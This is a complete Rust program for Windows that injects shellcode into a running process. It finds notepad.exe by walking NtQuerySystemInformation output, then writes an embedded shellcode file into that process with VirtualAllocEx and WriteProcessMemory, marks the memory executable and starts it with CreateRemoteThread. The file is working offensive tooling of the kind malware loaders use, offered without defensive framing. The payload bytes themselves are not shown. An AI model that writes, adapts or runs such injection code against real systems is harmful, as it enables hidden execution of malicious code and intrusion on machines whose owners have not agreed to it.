use core::slice;
use std::{mem::transmute, ptr::null_mut};

use windows_sys::{
    Wdk::System::SystemInformation::{NtQuerySystemInformation, SystemProcessInformation},
    Win32::{
        Foundation::STATUS_INFO_LENGTH_MISMATCH,
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
                VirtualProtectEx,
            },
            Threading::{
                CreateRemoteThread, OpenProcess, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
                PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, WaitForSingleObject,
            },
            WindowsProgramming::SYSTEM_PROCESS_INFORMATION,
        },
    },
};

const SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");
const SHELLCODE_SIZE: usize = SHELLCODE.len();

fn find_pid(process_name: &str) -> u32 {
    let mut pid: u32 = 0;
    unsafe {
        let mut return_length: u32 = 0;
        let mut status =
            NtQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_length);

        if status != STATUS_INFO_LENGTH_MISMATCH {
            println!(
                "[-] NtQuerySystemInformation failed with status: 0x{:X}",
                status
            );
            return pid;
        }

        let buffer_size = return_length as usize;
        let mut buffer: Vec<u8> = vec![0; buffer_size];

        status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut _,
            buffer_size as u32,
            &mut return_length,
        );

        if status != 0 {
            println!(
                "[-] NtQuerySystemInformation failed with status: 0x{:X}",
                status
            );
            return pid;
        }

        let mut process_info = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

        loop {
            if !(*process_info).ImageName.Buffer.is_null()
                && process_name.eq_ignore_ascii_case(
                    String::from_utf16_lossy(slice::from_raw_parts(
                        (*process_info).ImageName.Buffer,
                        (*process_info).ImageName.Length as usize / 2,
                    ))
                    .as_str(),
                )
            {
                pid = (*process_info).UniqueProcessId as u32;
                break;
            }

            if (*process_info).NextEntryOffset == 0 {
                break;
            }

            process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
                as *const SYSTEM_PROCESS_INFORMATION;
        }
    }

    pid
}

fn main() {
    let process_name = "notepad.exe".to_string();

    let pid = find_pid(&process_name);
    if pid == 0 {
        println!("[-] Process '{}' not found.", process_name);
        return;
    }

    println!("[+] Found process '{}' with PID: {}", process_name, pid);

    unsafe {
        let process_handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_CREATE_THREAD
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            0,
            pid,
        );

        if process_handle.is_null() {
            println!("[-] Failed to open process with PID: {}", pid);
            return;
        }

        let exec_mem = VirtualAllocEx(
            process_handle,
            null_mut(),
            SHELLCODE_SIZE,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if exec_mem.is_null() {
            println!("[-] Failed to allocate memory in target process.");
            return;
        }

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            process_handle,
            exec_mem,
            SHELLCODE.as_ptr() as *const _,
            SHELLCODE_SIZE,
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write shellcode to target process.");
            return;
        }

        let mut old_protect: u32 = 0;
        if VirtualProtectEx(
            process_handle,
            exec_mem,
            SHELLCODE_SIZE,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == 0
        {
            println!("[-] Failed to change memory protection in target process.");
            return;
        }

        let mut thread_id: u32 = 0;
        let thread_handle = CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            transmute(exec_mem),
            null_mut(),
            0,
            &mut thread_id,
        );

        if thread_handle.is_null() {
            println!("[-] Failed to create remote thread in target process.");
            return;
        }

        println!("[+] Remote thread created with Thread ID: {}", thread_id);

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

        println!("[+] Shellcode injected and executed successfully.");
    }
}
